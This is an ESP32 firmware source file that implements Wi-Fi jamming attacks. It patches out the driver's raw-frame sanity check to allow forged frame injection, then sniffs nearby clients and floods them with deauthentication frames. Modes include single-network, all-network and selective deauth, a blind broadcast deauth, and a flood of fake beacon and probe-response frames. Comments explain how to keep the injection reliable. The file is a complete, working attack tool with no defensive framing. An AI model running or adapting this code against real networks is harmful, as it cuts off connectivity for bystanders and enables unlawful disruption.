#include <WiFi.h>
#include <esp_wifi.h>
#include <sdkconfig.h>
#include <string.h>

#include "deauth.h"
#include "definitions.h"
#include "types.h"

int eliminated_stations;
bool deauth_active = false;

// esp_wifi_80211_tx() rejects forged management frames through this closed-source
// check; overriding it (plus -Wl,-z,muldefs) makes raw injection possible.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

namespace {

const uint8_t kBroadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
const uint8_t kRates[8] = {0x82, 0x84, 0x8B, 0x96, 0x0C, 0x12, 0x18, 0x24};

struct ap_target_t {
    uint8_t bssid[6];
    uint8_t channel;
    uint32_t frames;
    bool enabled;
};

struct sta_target_t {
    uint8_t mac[6];
    uint8_t ap[6];
    uint8_t channel;
    int16_t rssi;
    uint32_t frames;
};

struct rx_sample_t {
    uint8_t dest[6];
    uint8_t src[6];
    uint8_t bssid[6];
    uint8_t type;
    uint8_t subtype;
    uint16_t len;
};

const int kRxLogSize = 12;

attack_mode_t s_mode = ATTACK_IDLE;
uint16_t s_reason = 1;

ap_target_t s_aps[MAX_AP_TARGETS];
int s_ap_count = 0;
int s_ap_cursor = -1;
uint32_t s_ap_last_hop = 0;

sta_target_t s_stas[MAX_STA_TARGETS];
int s_sta_count = 0;

uint8_t s_single_bssid[6];

uint32_t s_deauth_frames = 0;
uint32_t s_probe_frames = 0;
uint32_t s_last_probe = 0;
uint32_t s_last_channel_hop = 0;
uint8_t s_probe_channel = 1;

volatile uint32_t s_rx_total = 0;
volatile uint32_t s_rx_match = 0;
// Raw injection accounting: every esp_wifi_80211_tx() call is counted, so a
// "deauth_frames grows but nothing happens" report can be split into
// "the driver refused the frame" vs "the frame went out and the client ignored it".
uint32_t s_tx_ok = 0;
uint32_t s_tx_err = 0;
int s_tx_last_err = 0;
uint32_t s_tx_err_nomem = 0;
uint32_t s_tx_err_invalid = 0;
uint32_t s_tx_err_other = 0;
uint32_t s_tx_dropped = 0;
uint32_t s_blind_frames = 0;

// The sniffer runs in the Wi-Fi task: blasting 16 raw frames from there starves
// the driver's TX buffers (half of the calls returned ESP_ERR_NO_MEM), so the
// callback only records "who to kick" and the main loop does the injection at a
// controlled rate.
struct pending_tx_t {
    uint8_t client[6];
    uint8_t bssid[6];
};
const int kTxQueue = 16;
pending_tx_t s_txq[kTxQueue];
volatile int s_txq_head = 0;
volatile int s_txq_tail = 0;
uint32_t s_last_inject_ms = 0;
uint32_t s_last_blind_ms = 0;
// Burst in progress. A burst is 16 frames, but a single tick cannot push 16
// frames through the driver (it answers ESP_ERR_NO_MEM long before that), so the
// burst is drained frame by frame across ticks and never silently loses frames.
uint8_t s_burst_client[6];
uint8_t s_burst_bssid[6];
int s_burst_left = 0;
uint32_t s_backoff_until_ms = 0;
// Received frames by category: management subtypes 0..15 (deauth = 12),
// beacon = 8, probe resp = 5, plus control/data totals. This is how we prove
// from a second board that our forged frames really reached the air.
volatile uint32_t s_rx_mgmt_sub[16];
volatile uint32_t s_rx_ctrl = 0;
volatile uint32_t s_rx_data = 0;
rx_sample_t s_rx_log[kRxLogSize];
volatile int s_rx_log_count = 0;

bool s_sta_scan_active = false;
uint32_t s_sta_scan_deadline = 0;
uint8_t s_sta_scan_channel = 1;
uint32_t s_sta_scan_last_hop = 0;
bool s_sta_scan_ready = false;

uint32_t pseudo_rand(void) {
    static uint32_t state = 0x12345678;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}

void random_mac(uint8_t* mac) {
    const uint32_t r = pseudo_rand();
    mac[0] = 0x02 | (r & 0xFC);  // locally administered, unicast
    mac[1] = (r >> 8) & 0xFF;
    mac[2] = (r >> 16) & 0xFF;
    mac[3] = (r >> 24) & 0xFF;
    mac[4] = pseudo_rand() & 0xFF;
    mac[5] = pseudo_rand() & 0xFF;
}

void random_ssid(char* ssid, size_t max_len) {
    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    const size_t max_body = (max_len > 14) ? 11 : 6;
    const size_t len = 4 + (pseudo_rand() % max_body);
    for (size_t i = 0; i < len && i + 1 < max_len; i++) {
        ssid[i] = alphabet[pseudo_rand() % (sizeof(alphabet) - 1)];
    }
    ssid[len] = 0;
}

// ------------------------------------------------------------------ radio setup

void apply_band_mode(void) {
#if CONFIG_SOC_WIFI_SUPPORT_5G
    esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
#endif
}

void apply_country(uint8_t channel, bool all_channels) {
    wifi_country_t country = {};
    memcpy(country.cc, "CN", 2);
    country.schan = 1;
    country.nchan = 13;
    if (!all_channels && channel <= 11) {
        memcpy(country.cc, "01", 2);
        country.nchan = 11;
    }
#if CONFIG_SOC_WIFI_SUPPORT_5G
    country.wifi_5g_channel_mask = WIFI_CHANNEL_36 | WIFI_CHANNEL_40 | WIFI_CHANNEL_44 |
                                   WIFI_CHANNEL_48 | WIFI_CHANNEL_52 | WIFI_CHANNEL_56 |
                                   WIFI_CHANNEL_60 | WIFI_CHANNEL_64 | WIFI_CHANNEL_100 |
                                   WIFI_CHANNEL_104 | WIFI_CHANNEL_108 | WIFI_CHANNEL_112 |
                                   WIFI_CHANNEL_116 | WIFI_CHANNEL_120 | WIFI_CHANNEL_124 |
                                   WIFI_CHANNEL_128 | WIFI_CHANNEL_132 | WIFI_CHANNEL_136 |
                                   WIFI_CHANNEL_140 | WIFI_CHANNEL_144 | WIFI_CHANNEL_149 |
                                   WIFI_CHANNEL_153 | WIFI_CHANNEL_157 | WIFI_CHANNEL_161 |
                                   WIFI_CHANNEL_165;
#endif
    country.max_tx_power = 20;
    country.policy = WIFI_COUNTRY_POLICY_MANUAL;
    esp_wifi_set_country(&country);
}

uint8_t next_probe_channel(void) {
    static const uint8_t channels[] = {1, 6, 11, 3, 9, 13, 2, 7, 12};
    s_probe_channel = channels[pseudo_rand() % (sizeof(channels))];
    return s_probe_channel;
}

void radio_to_sta(void) {
    WiFi.disconnect();
    WiFi.mode(WIFI_MODE_STA);
}

// ------------------------------------------------------------------ frames

size_t build_deauth(uint8_t* frame, const uint8_t station[6], const uint8_t bssid[6],
                    uint16_t reason) {
    memset(frame, 0, 26);
    frame[0] = 0xC0;  // deauth
    memcpy(frame + 4, station, 6);
    memcpy(frame + 10, bssid, 6);
    memcpy(frame + 16, bssid, 6);
    frame[22] = 0xF0;
    frame[23] = 0xFF;
    frame[24] = reason & 0xFF;
    frame[25] = (reason >> 8) & 0xFF;
    return 26;
}

// Beacon (subtype 8) and probe response (subtype 5) share the same body layout.
size_t build_beacon_like(uint8_t* frame, uint8_t subtype, const uint8_t dest[6],
                         const uint8_t bssid[6], const char* ssid, uint8_t channel) {
    size_t n = 0;
    frame[n++] = (uint8_t)((subtype << 4) | 0x00);
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memcpy(frame + n, dest, 6);
    n += 6;
    memcpy(frame + n, bssid, 6);
    n += 6;
    memcpy(frame + n, bssid, 6);
    n += 6;
    frame[n++] = 0x00;
    frame[n++] = 0x00;
    memset(frame + n, 0, 8);  // timestamp
    n += 8;
    frame[n++] = 0x64;  // beacon interval 100 TU
    frame[n++] = 0x00;
    frame[n++] = 0x31;  // capability: ESS | short slot | short preamble
    frame[n++] = 0x04;
    const size_t len = strlen(ssid);
    frame[n++] = 0x00;  // SSID
    frame[n++] = (uint8_t)len;
    memcpy(frame + n, ssid, len);
    n += len;
    frame[n++] = 0x01;  // supported rates
    frame[n++] = sizeof(kRates);
    memcpy(frame + n, kRates, sizeof(kRates));
    n += sizeof(kRates);
    frame[n++] = 0x03;  // DS parameter
    frame[n++] = 1;
    frame[n++] = channel;
    return n;
}

int find_ap(const uint8_t bssid[6]);

void reset_diag_counters(void) {
    s_tx_ok = 0;
    s_tx_err = 0;
    s_tx_last_err = 0;
    s_tx_err_nomem = 0;
    s_tx_err_invalid = 0;
    s_tx_err_other = 0;
    s_tx_dropped = 0;
    s_blind_frames = 0;
    s_txq_head = 0;
    s_txq_tail = 0;
    s_last_inject_ms = 0;
    s_last_blind_ms = 0;
    s_burst_left = 0;
    s_backoff_until_ms = 0;
    s_rx_ctrl = 0;
    s_rx_data = 0;
    for (int i = 0; i < 16; i++) {
        s_rx_mgmt_sub[i] = 0;
    }
}

void queue_deauth(const uint8_t client[6], const uint8_t bssid[6]) {
    const int next = (s_txq_head + 1) % kTxQueue;
    if (next == s_txq_tail) {
        s_tx_dropped++;
        return;
    }
    memcpy(s_txq[s_txq_head].client, client, 6);
    memcpy(s_txq[s_txq_head].bssid, bssid, 6);
    s_txq_head = next;
}

// Returns true when the driver accepted the frame.
bool inject_one(const uint8_t station[6], const uint8_t bssid[6]) {
    uint8_t frame[32];
    const size_t len = build_deauth(frame, station, bssid, s_reason);
    const esp_err_t res = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
    if (res != ESP_OK) {
        s_tx_err++;
        s_tx_last_err = (int)res;
        // Buffers are full: backing off 5 ms is much cheaper than hammering the
        // driver every millisecond (which is what inflated txerr before).
        s_backoff_until_ms = millis() + 5;
        if (res == ESP_ERR_NO_MEM) {
            s_tx_err_nomem++;
        } else if (res == ESP_ERR_INVALID_ARG) {
            s_tx_err_invalid++;
        } else {
            s_tx_err_other++;
        }
        return false;
    }
    s_tx_ok++;
    s_deauth_frames++;
    return true;
}

// Push as much of the pending burst as the driver accepts, then stop and resume
// on the next tick (attack_step calls this every few ms).
void drain_tx_queue(void) {
    if (s_burst_left == 0) {
        if (s_txq_tail == s_txq_head) {
            return;
        }
        memcpy(s_burst_client, s_txq[s_txq_tail].client, 6);
        memcpy(s_burst_bssid, s_txq[s_txq_tail].bssid, 6);
        s_txq_tail = (s_txq_tail + 1) % kTxQueue;
        s_burst_left = NUM_FRAMES_PER_DEAUTH;
        eliminated_stations++;
        if (s_mode == ATTACK_DEAUTH_MULTI) {
            const int idx = find_ap(s_burst_bssid);
            if (idx >= 0) {
                s_aps[idx].frames += NUM_FRAMES_PER_DEAUTH + NUM_BROADCAST_PER_DEAUTH;
            }
        }
    }
    while (s_burst_left > 0) {
        if (!inject_one(s_burst_client, s_burst_bssid)) {
            return;  // buffers full: retry this frame after the backoff
        }
        s_burst_left--;
    }

    // One broadcast deauth on top of the unicast burst: plenty of cheap clients
    // only act on the broadcast form, and it costs a single frame.
    for (int i = 0; i < NUM_BROADCAST_PER_DEAUTH; i++) {
        if (!inject_one(kBroadcast, s_burst_bssid)) {
            return;
        }
    }
}

int find_ap(const uint8_t bssid[6]) {
    for (int i = 0; i < s_ap_count; i++) {
        if (s_aps[i].enabled && memcmp(s_aps[i].bssid, bssid, 6) == 0) {
            return i;
        }
    }
    return -1;
}

// ------------------------------------------------------------------ sniffer

IRAM_ATTR void sniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    const wifi_promiscuous_pkt_t* raw = (wifi_promiscuous_pkt_t*)buf;
    const wifi_packet_t* packet = (wifi_packet_t*)raw->payload;
    const mac_hdr_t* hdr = &packet->hdr;

    s_rx_total = s_rx_total + 1;

    const uint16_t sig_len = raw->rx_ctrl.sig_len;
    const uint16_t fc = hdr->frame_ctrl;
    const uint8_t frame_type = (uint8_t)((fc >> 2) & 0x03);
    const uint8_t frame_subtype = (uint8_t)((fc >> 4) & 0x0F);
    if (frame_type == 0) {
        if (frame_subtype < 16) {
            s_rx_mgmt_sub[frame_subtype] = s_rx_mgmt_sub[frame_subtype] + 1;
        }
    } else if (frame_type == 1) {
        s_rx_ctrl = s_rx_ctrl + 1;
    } else if (frame_type == 2) {
        s_rx_data = s_rx_data + 1;
    }

    if (sig_len <= sizeof(mac_hdr_t)) {
        return;
    }
    if (s_rx_log_count < kRxLogSize) {
        rx_sample_t* sample = &s_rx_log[s_rx_log_count];
        memcpy(sample->dest, hdr->dest, 6);
        memcpy(sample->src, hdr->src, 6);
        memcpy(sample->bssid, hdr->bssid, 6);
        sample->type = frame_type;
        sample->subtype = frame_subtype;
        sample->len = sig_len;
        s_rx_log_count = s_rx_log_count + 1;
    }

    // Address fields present? Control frames are short: RTS / PS-Poll carry
    // Addr1+Addr2 in 16 bytes (+4 FCS = 20), so the management-oriented 22 byte
    // threshold used to reject every RTS before its Addr2 was ever looked at.
    const bool is_ctrl = (frame_type == 1);
    const bool has_addr2 = is_ctrl ? (sig_len >= 20) : (sig_len >= 22);
    const bool has_addr3 = !is_ctrl && (sig_len >= 28);

    if (s_sta_scan_active) {
        if (has_addr2 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
            memcmp(hdr->src, hdr->bssid, 6) != 0) {
            for (int i = 0; i < s_sta_count; i++) {
                if (memcmp(s_stas[i].mac, hdr->src, 6) == 0) {
                    s_stas[i].rssi = (int16_t)raw->rx_ctrl.rssi;
                    s_stas[i].channel = s_sta_scan_channel;
                    s_stas[i].frames++;
                    return;
                }
            }
            if (s_sta_count < MAX_STA_TARGETS) {
                sta_target_t* sta = &s_stas[s_sta_count++];
                memcpy(sta->mac, hdr->src, 6);
                if (has_addr3) {
                    memcpy(sta->ap, hdr->bssid, 6);
                } else {
                    memset(sta->ap, 0, 6);
                }
                sta->channel = s_sta_scan_channel;
                sta->rssi = (int16_t)raw->rx_ctrl.rssi;
                sta->frames = 1;
            }
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_SINGLE) {
        bool matched = false;
        uint8_t client[6];
        if (has_addr2 && memcmp(hdr->dest, s_single_bssid, 6) == 0) {
            memcpy(client, hdr->src, 6);
            matched = true;
        } else if (has_addr3 && memcmp(hdr->bssid, s_single_bssid, 6) == 0 &&
                   memcmp(hdr->dest, kBroadcast, 6) != 0 &&
                   memcmp(hdr->dest, s_single_bssid, 6) != 0) {
            memcpy(client, hdr->dest, 6);
            matched = true;
        }
        if (matched) {
            s_rx_match = s_rx_match + 1;
            queue_deauth(client, s_single_bssid);
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (has_addr2 && memcmp(hdr->dest, kBroadcast, 6) != 0) {
            const int idx = find_ap(hdr->dest);
            if (idx >= 0) {
                s_rx_match = s_rx_match + 1;
                queue_deauth(hdr->src, hdr->dest);
                return;
            }
        }
        if (has_addr3) {
            const int idx = find_ap(hdr->bssid);
            if (idx >= 0 && memcmp(hdr->dest, kBroadcast, 6) != 0 &&
                memcmp(hdr->dest, hdr->bssid, 6) != 0) {
                s_rx_match = s_rx_match + 1;
                queue_deauth(hdr->dest, hdr->bssid);
            }
        }
    }
}

// ------------------------------------------------------------------ helpers

void start_promiscuous(void) {
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(&sniffer);
}

void fill_ap_table(void) {
    s_ap_count = 0;
    // Reuse the cached scan result instead of blocking the loop for another scan.
    int n = WiFi.scanComplete();
    if (n < 0) {
        n = WiFi.scanNetworks();
    }
    for (int i = 0; i < n && s_ap_count < MAX_AP_TARGETS; i++) {
        const uint8_t* bssid = WiFi.BSSID(i);
        if (bssid == nullptr) {
            continue;
        }
        ap_target_t* ap = &s_aps[s_ap_count++];
        memcpy(ap->bssid, bssid, 6);
        ap->channel = WiFi.channel(i);
        ap->frames = 0;
        ap->enabled = true;
    }
}

void begin_multi(uint16_t reason) {
    s_reason = reason;
    s_mode = ATTACK_DEAUTH_MULTI;
    s_ap_cursor = -1;
    s_ap_last_hop = 0;
    eliminated_stations = 0;
    s_deauth_frames = 0;
    s_rx_total = 0;
    s_rx_match = 0;
    s_rx_log_count = 0;
    reset_diag_counters();
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    start_promiscuous();
    deauth_active = true;
}

}  // namespace

// ------------------------------------------------------------------ public API

void prepare_radio_for_scan() {
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
}

uint8_t sweep_next_channel() {
    s_probe_channel = (s_probe_channel % CHANNEL_MAX) + 1;
    esp_wifi_set_channel(s_probe_channel, WIFI_SECOND_CHAN_NONE);
    return s_probe_channel;
}

bool attack_deauth_single(int index, uint16_t reason) {
    const uint8_t* bssid = WiFi.BSSID(index);
    if (bssid == nullptr) {
        return false;
    }
    memcpy(s_single_bssid, bssid, 6);
    const uint8_t channel = WiFi.channel(index);
    s_reason = reason;
    s_mode = ATTACK_DEAUTH_SINGLE;
    eliminated_stations = 0;
    s_deauth_frames = 0;
    s_rx_total = 0;
    s_rx_match = 0;
    s_rx_log_count = 0;
    reset_diag_counters();
    s_ap_count = 0;

    apply_band_mode();
    apply_country(channel, false);
    radio_to_sta();
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    start_promiscuous();
    deauth_active = true;
    return true;
}

bool attack_deauth_all(uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = true;
    }
    begin_multi(reason);
    return true;
}

bool attack_deauth_only(const int* idx, int count, uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = false;
    }
    int enabled = 0;
    for (int k = 0; k < count; k++) {
        if (idx[k] >= 0 && idx[k] < s_ap_count) {
            s_aps[idx[k]].enabled = true;
            enabled++;
        }
    }
    if (enabled == 0) {
        return false;
    }
    begin_multi(reason);
    return true;
}

bool attack_deauth_except(const int* idx, int count, uint16_t reason) {
    fill_ap_table();
    if (s_ap_count == 0) {
        return false;
    }
    for (int i = 0; i < s_ap_count; i++) {
        s_aps[i].enabled = true;
    }
    for (int k = 0; k < count; k++) {
        if (idx[k] >= 0 && idx[k] < s_ap_count) {
            s_aps[idx[k]].enabled = false;
        }
    }
    begin_multi(reason);
    return true;
}

bool attack_probe_broadcast() {
    reset_diag_counters();
    s_mode = ATTACK_PROBE_BROADCAST;
    s_probe_frames = 0;
    s_last_probe = 0;
    s_last_channel_hop = 0;
    eliminated_stations = 0;
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    esp_wifi_set_channel(next_probe_channel(), WIFI_SECOND_CHAN_NONE);
    deauth_active = true;
    return true;
}

void attack_stop() {
    esp_wifi_set_promiscuous(false);
    deauth_active = false;
    s_mode = ATTACK_IDLE;
}

void attack_step() {
    const uint32_t now = millis();

    if (s_sta_scan_active) {
        if (now - s_sta_scan_last_hop > 150) {
            s_sta_scan_last_hop = now;
            s_sta_scan_channel = (s_sta_scan_channel % CHANNEL_MAX) + 1;
            esp_wifi_set_channel(s_sta_scan_channel, WIFI_SECOND_CHAN_NONE);
        }
        if (now > s_sta_scan_deadline) {
            s_sta_scan_active = false;
            esp_wifi_set_promiscuous(false);
            s_sta_scan_ready = true;
        }
        return;
    }

    if (s_mode == ATTACK_DEAUTH_SINGLE || s_mode == ATTACK_DEAUTH_MULTI) {
        if (now != s_last_inject_ms && (int32_t)(now - s_backoff_until_ms) >= 0) {
            s_last_inject_ms = now;
            drain_tx_queue();
        }
    }

    // Blind fallback: a broadcast deauth to the AP we are parked on. It needs no
    // sniffed client, so it still does something when every client in the BSS is
    // silent -- or talks 802.11ax, which an 11n radio cannot decode at all.
    if (s_mode == ATTACK_DEAUTH_SINGLE) {
        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
            s_last_blind_ms = now;
            if (inject_one(kBroadcast, s_single_bssid)) {
                s_blind_frames++;
            }
        }
    } else if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (now - s_last_blind_ms >= BLIND_DEAUTH_PERIOD_MS) {
            s_last_blind_ms = now;
            for (int tries = 0; tries < s_ap_count; tries++) {
                const int idx = (s_ap_cursor + tries + s_ap_count) % s_ap_count;
                if (s_aps[idx].enabled) {
                    if (inject_one(kBroadcast, s_aps[idx].bssid)) {
                        s_blind_frames++;
                        s_aps[idx].frames++;
                    }
                    break;
                }
            }
        }
    }

    if (s_mode == ATTACK_DEAUTH_MULTI) {
        if (s_ap_count == 0) {
            return;
        }
        if (s_ap_cursor < 0 || now - s_ap_last_hop >= 250) {
            s_ap_last_hop = now;
            for (int tries = 0; tries < s_ap_count; tries++) {
                s_ap_cursor = (s_ap_cursor + 1) % s_ap_count;
                if (s_aps[s_ap_cursor].enabled) {
                    esp_wifi_set_channel(s_aps[s_ap_cursor].channel, WIFI_SECOND_CHAN_NONE);
                    break;
                }
            }
        }
        return;
    }

    if (s_mode == ATTACK_PROBE_BROADCAST) {
        if (now - s_last_channel_hop > 120) {
            s_last_channel_hop = now;
            esp_wifi_set_channel(next_probe_channel(), WIFI_SECOND_CHAN_NONE);
        }
        if (now - s_last_probe >= 4) {
            s_last_probe = now;
            uint8_t frame[96];
            uint8_t bssid[6];
            char ssid[16];
            // Flood the air with fake APs: beacons plus broadcast probe responses.
            // Both go out at legacy rates, so any nearby client sees a wall of
            // bogus networks regardless of its own PHY generation.
            for (int i = 0; i < 4; i++) {
                random_ssid(ssid, sizeof(ssid));
                random_mac(bssid);
                size_t len = build_beacon_like(frame, 8, kBroadcast, bssid, ssid, s_probe_channel);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                s_probe_frames++;
                len = build_beacon_like(frame, 5, kBroadcast, bssid, ssid, s_probe_channel);
                esp_wifi_80211_tx(WIFI_IF_STA, frame, len, false);
                s_probe_frames++;
            }
        }
    }
}

attack_mode_t attack_get_mode() {
    return s_mode;
}

const char* attack_mode_name() {
    switch (s_mode) {
        case ATTACK_DEAUTH_SINGLE:
            return "deauth";
        case ATTACK_DEAUTH_MULTI:
            return "deauth-multi";
        case ATTACK_PROBE_BROADCAST:
            return "probe-bcast";
        default:
            return "idle";
    }
}

uint32_t attack_deauth_frames() {
    return s_deauth_frames;
}

uint32_t attack_probe_frames() {
    return s_probe_frames;
}

uint32_t attack_rx_frames() {
    return s_rx_total;
}

uint32_t attack_tx_ok() {
    return s_tx_ok;
}

uint32_t attack_tx_err() {
    return s_tx_err;
}

int attack_tx_last_err(void) {
    return s_tx_last_err;
}

uint32_t attack_tx_err_nomem(void) {
    return s_tx_err_nomem;
}

uint32_t attack_tx_err_invalid(void) {
    return s_tx_err_invalid;
}

uint32_t attack_tx_err_other(void) {
    return s_tx_err_other;
}

uint32_t attack_tx_dropped(void) {
    return s_tx_dropped;
}

uint32_t attack_blind_frames() {
    return s_blind_frames;
}

void attack_rx_mix(uint32_t mgmt_sub[16], uint32_t* ctrl, uint32_t* data) {
    for (int i = 0; i < 16; i++) {
        mgmt_sub[i] = s_rx_mgmt_sub[i];
    }
    if (ctrl != nullptr) {
        *ctrl = s_rx_ctrl;
    }
    if (data != nullptr) {
        *data = s_rx_data;
    }
}

uint32_t attack_rx_matches() {
    return s_rx_match;
}

int attack_rx_log_count() {
    return s_rx_log_count;
}

bool attack_rx_log_at(int i, uint8_t dest[6], uint8_t src[6], uint8_t bssid[6], uint8_t* type,
                      uint8_t* subtype, uint16_t* len) {
    if (i < 0 || i >= s_rx_log_count) {
        return false;
    }
    memcpy(dest, s_rx_log[i].dest, 6);
    memcpy(src, s_rx_log[i].src, 6);
    memcpy(bssid, s_rx_log[i].bssid, 6);
    if (type) *type = s_rx_log[i].type;
    if (subtype) *subtype = s_rx_log[i].subtype;
    if (len) *len = s_rx_log[i].len;
    return true;
}

int attack_ap_count() {
    return s_ap_count;
}

int attack_ap_enabled_count() {
    int n = 0;
    for (int i = 0; i < s_ap_count; i++) {
        if (s_aps[i].enabled) n++;
    }
    return n;
}

bool attack_ap_info(int i, const uint8_t** bssid, uint32_t* frames, uint8_t* channel) {
    if (i < 0 || i >= s_ap_count) {
        return false;
    }
    if (bssid) *bssid = s_aps[i].bssid;
    if (frames) *frames = s_aps[i].frames;
    if (channel) *channel = s_aps[i].channel;
    return true;
}

void stations_begin(uint16_t seconds) {
    s_sta_count = 0;
    s_sta_scan_active = true;
    s_sta_scan_ready = false;
    s_sta_scan_deadline = millis() + (uint32_t)seconds * 1000UL;
    s_sta_scan_channel = 1;
    s_sta_scan_last_hop = 0;
    apply_band_mode();
    apply_country(CHANNEL_MAX, true);
    radio_to_sta();
    esp_wifi_set_channel(s_sta_scan_channel, WIFI_SECOND_CHAN_NONE);
    start_promiscuous();
}

bool stations_poll() {
    if (s_sta_scan_active || !s_sta_scan_ready) {
        return false;
    }
    s_sta_scan_ready = false;
    return true;
}

int stations_count() {
    return s_sta_count;
}

bool stations_info(int i, const uint8_t** mac, const uint8_t** ap, uint8_t* channel, int16_t* rssi,
                   uint32_t* frames) {
    if (i < 0 || i >= s_sta_count) {
        return false;
    }
    if (mac) *mac = s_stas[i].mac;
    if (ap) *ap = s_stas[i].ap;
    if (channel) *channel = s_stas[i].channel;
    if (rssi) *rssi = s_stas[i].rssi;
    if (frames) *frames = s_stas[i].frames;
    return true;
}
